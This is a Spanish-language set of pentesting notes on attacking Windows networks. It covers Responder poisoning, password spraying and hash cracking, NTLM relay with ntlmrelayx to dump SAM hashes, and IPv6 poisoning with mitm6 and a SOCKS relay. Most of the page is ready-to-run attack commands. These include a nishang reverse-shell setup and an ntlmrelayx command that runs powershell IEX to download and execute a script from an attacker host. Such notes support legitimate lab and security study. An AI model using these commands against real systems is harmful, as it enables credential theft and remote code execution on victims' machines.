# Samba & NTML Relay

## IPv4

### Samba Relay

```
sudo responder -I ens37 -dw
```

<figure><img src="../../.gitbook/assets/Pasted image 20250227175100.png" alt=""><figcaption></figcaption></figure>

> Podemos tratar de crackear los hahes con john `john -w:/rocku.txt hashes`

### Password Spraying

```
crackmapexec smb 100.100.100.0/24 -u 'Cbollin' -p 'Password1'
```

> Aqui probamos la contraseña de un usuario en especifico en todos los usuarios del rango de ip en el servico SMB Podemos comprobar si tenemos permisos administrativos sorbre algun usuario

### NTML Relay

> Primero Off SMB & HTTP en el `/usr/share/responder/Responder.conf`

1º Defino un archivo targets.txt con las ips 2º Ahora lanzo el responder

```
sudo responder -I ens37 -dw
```

3º Lanzo el ntlmrelayx con el archivo targets

```
sudo su && ntlmrelayx.py -tf targets.txt -smb2support
```

> Existen dos equipos cebollin y champi, cebollin es admin sobre champi y yo lo he sabido haciendo un password spraying, ahora quiero hackear a champi asi que lo meto en la lista del target.
>
> Enveneno el trafico con el responder y digo que el samba soy yo (ya que no esta firmado) y cuando cebollin busque algo a nivel de red, autenticate contra mi, pero ahora va a aprovechar sus credenciales privilegiadas para redirigir esa autenticacion sobre el equipo victima champi y dumpear la sam hash del equipo

<figure><img src="../../.gitbook/assets/Pasted image 20250227200332.png" alt=""><figcaption></figcaption></figure>

Y ahora podríamos hacer passthehash

### Ejecución de comandos

{% embed url="https://github.com/samratashok/nishang" %}

> Y dentro utilizamos la shell Invoke-PowershellTCP.ps1

```bash
git clone git clone https://github.com/samratashok/nishang
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 PS.ps1
```

Y añadimos esta linea al final del PS.ps1 --MODIFICAR--

```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port ATTACKER_PORT" >> PS.ps1 
```

Ahora me levanto un servidor web en python y me pongo a la escucha por el puerto

```bash
sudo python3 -m http.server
###
rlwrap -cAr nc -lvnp 1234
```

Y ahora levantamos el responder y decimos con ntlmrelayx, oye ya no quiero que me dumppes la sam de la victima si no que me ejcutes este comando

```bash
sudo responder -I ens37 -dw 
###
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP:8000/PS.ps1')"

```

## IPv6

### Mitm6

```
mitm6 -d deimcorp.local
```

> Envenenamos el dominio de la empresa

```
ntlmrelayx.py -6 -wh ATTACKER_IP -t smb://VICTIM_IP -socks -debug -smb2support
```

> Este hace como una terminal, y cuando un usuario busque algo a nivel de red local intenta ver si tiene permisos de administrador, se puede ver las intercepciones con un socks&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250228165324.png" alt=""><figcaption></figcaption></figure>

Tras un rato, pillamos esto:&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250228172649.png" alt=""><figcaption></figcaption></figure>

Vemos que el usuario cbollin es admin ante ese equipo

> Configuracion del /etc/proxychains4.conf

```bash
#dynamic_chain
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4  127.0.0.1 1080

#socks5  127.0.0.1 1082
#socks5  127.0.0.1 1081
#socks5  127.0.0.1 1080
```

Ahora como yo tengo un relayinc de una credencial de usario administrador sobre esa maquina, puedo tirar de proxychains

```bash
proxychains crackmapexec smb 100.100.100.130 -u 'champi' -p 'loquesea' -d 'deimcorp.local' --sam 2>/dev/null 
```

<figure><img src="../../.gitbook/assets/Pasted image 20250301120209.png" alt=""><figcaption></figcaption></figure>
